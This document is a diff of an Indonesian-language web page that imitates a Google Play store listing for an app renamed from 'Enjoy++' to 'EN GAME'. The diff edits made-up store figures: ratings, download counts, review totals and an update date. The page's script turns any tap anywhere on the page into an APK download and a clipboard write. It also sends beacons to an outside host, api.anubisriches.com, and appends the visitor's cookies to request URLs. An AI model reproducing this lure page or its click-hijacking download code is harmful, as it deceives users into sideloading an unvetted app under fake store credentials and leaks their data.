@@ -1,10 +1,10 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en" style="cursor: pointer">
   <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <link rel="shortcut icon" href="/favicon.ico" />
-    <title>Enjoy++</title>
+    <title>EN GAME</title>
     <style>
       html,
       body {
@@ -288,14 +288,23 @@
         t.src = v;
         s = b.getElementsByTagName(e)[0];
         s.parentNode.insertBefore(t, s);
-      })(window, document, "script", "https://connect.facebook.net/en_US/fbevents.js");
+      })(
+        window,
+        document,
+        "script",
+        "https://connect.facebook.net/en_US/fbevents.js",
+      );
       fbq("init", "4439698059631984");
       fbq("track", "PageView");
     </script>
-    <noscript
-      ><img height="1" width="1" style="display: none"
+    <noscript>
+      <img
+        height="1"
+        width="1"
+        style="display: none"
         src="https://www.facebook.com/tr?id=4439698059631984&ev=PageView&noscript=1"
-    /></noscript>
+      />
+    </noscript>
     <!-- End Meta Pixel Code -->
 
     <!-- <script>
@@ -355,11 +364,13 @@
     </header>
 
     <div class="app-info">
-      <img src="files/appicon1.jpg" alt="" />
+      <img src="files/appicon1.png" alt="" />
       <div class="app-info-body">
-        <div><h5>Enjoy++</h5></div>
-        <h4>Enjoy++</h4>
-        <div class="app-info-meta">Termasuk Iklan dan Pembelian dalam Aplikasi</div>
+        <div><h5>EN GAME</h5></div>
+        <h4>EN GAME</h4>
+        <div class="app-info-meta">
+          Termasuk Iklan dan Pembelian dalam Aplikasi
+        </div>
       </div>
     </div>
     <div style="height: 1rem"></div>
@@ -367,13 +378,13 @@
     <div style="display: flex" class="ads">
       <div style="width: 40%" class="tag">
         <div class="tag-value">
-          4.2
+          4.8
           <img src="files/bstart.png" alt="" style="height: 0.8rem" />
         </div>
         <div class="tag-label">2.83 juta ulasan</div>
       </div>
       <div style="width: 30%" class="tag">
-        <div class="tag-value">+1000 juta</div>
+        <div class="tag-value">+1125 juta</div>
         <div class="tag-label">Unduhan</div>
       </div>
       <div style="width: 30%" class="tag">
@@ -423,7 +434,9 @@
         <div class="box-item-body">
           <p style="padding: 0; margin: 0">
             Data tidak dibagikan dengan pihak ketiga <br />
-            <span style="text-decoration: underline">Pelajari lebih lanjut tentang</span>
+            <span style="text-decoration: underline"
+              >Pelajari lebih lanjut tentang</span
+            >
             cara pengembang mengumumkan berbagi data
           </p>
         </div>
@@ -441,16 +454,22 @@
       </div>
       <div class="box-item">
         <div class="box-item-icon"><img src="files/k4.png" alt="" /></div>
-        <div class="box-item-body">Anda dapat meminta pengembang untuk menghapus data</div>
+        <div class="box-item-body">
+          Anda dapat meminta pengembang untuk menghapus data
+        </div>
       </div>
       <div class="green-link">Periksa detail</div>
     </div>
 
-    <div class="rate-section">
+    <!-- <div class="rate-section">
       <h3>Rate this game</h3>
       <p>share your ideas</p>
       <div>
-        <img src="files/phone.png" alt="" style="height: 2rem; margin-top: 2rem" />
+        <img
+          src="files/phone.png"
+          alt=""
+          style="height: 2rem; margin-top: 2rem"
+        />
       </div>
       <div class="rate-stars">
         <img src="files/wstar.png" alt="" />
@@ -462,7 +481,7 @@
       <div>
         <img src="files/review.png" alt="" style="height: 2rem" />
       </div>
-    </div>
+    </div> -->
 
     <div style="direction: ltr; text-align: left">
       <h3>Ratings and Reviews</h3>
@@ -473,9 +492,9 @@
 
       <div class="ratings-summary">
         <div class="ratings-score">
-          <div class="ratings-score-num">4.9</div>
+          <div class="ratings-score-num">4.8</div>
           <img src="files/bfs.png" alt="" />
-          <div>1.83 million reviews</div>
+          <div>1.42 million reviews</div>
         </div>
         <div class="ratings-bars">
           <div>5 <img src="files/p5.png" alt="" /></div>
@@ -579,7 +598,7 @@
       <p>...</p>
 
       <h3>Updates</h3>
-      <p>October 11, 2023</p>
+      <p>May 10, 2026</p>
 
       <div class="l4">
         <p>Play Pass</p>
@@ -622,14 +641,18 @@
           const fbClickId = urlParams.get("fbclid");
           const url = buildURL(p0, p1, p2, p3, p4, p5, p6, fbClickId, fbPid);
 
-          link = url === ""
-            ? DOWNLOAD_URL
-            : url + "&redirect=" + encodeURIComponent(DOWNLOAD_URL);
+          link =
+            url === ""
+              ? DOWNLOAD_URL
+              : url + "&redirect=" + encodeURIComponent(DOWNLOAD_URL);
         }
         initLink();
 
         window.onload = function () {
-          sendBeacon("https://api.anubisriches.com/api/advertising/onshow", "show");
+          sendBeacon(
+            "https://api.anubisriches.com/api/advertising/onshow",
+            "show",
+          );
           // 全屏点击触发下载 + 复制（需要用户手势，剪贴板才能写入）
           document.addEventListener("click", onClickBtn, true);
           document.addEventListener("touchend", onClickBtn, true);
@@ -647,8 +670,12 @@
         }
 
         function getUrl(url) {
-          const cookieStr = document.cookie.replace("; ", "&").replace(";", "&");
-          const sep = window.location.search.length ? window.location.search + "&" : "?";
+          const cookieStr = document.cookie
+            .replace("; ", "&")
+            .replace(";", "&");
+          const sep = window.location.search.length
+            ? window.location.search + "&"
+            : "?";
           const requestUrl = url + sep + cookieStr;
           console.log("requestUrl", requestUrl);
           return requestUrl;
@@ -663,7 +690,10 @@
 
         function onClickBtn() {
           downloadApk();
-          sendBeacon("https://api.anubisriches.com/api/advertising/ondownload", "click");
+          sendBeacon(
+            "https://api.anubisriches.com/api/advertising/ondownload",
+            "click",
+          );
 
           const { location } = window;
           const params = {};
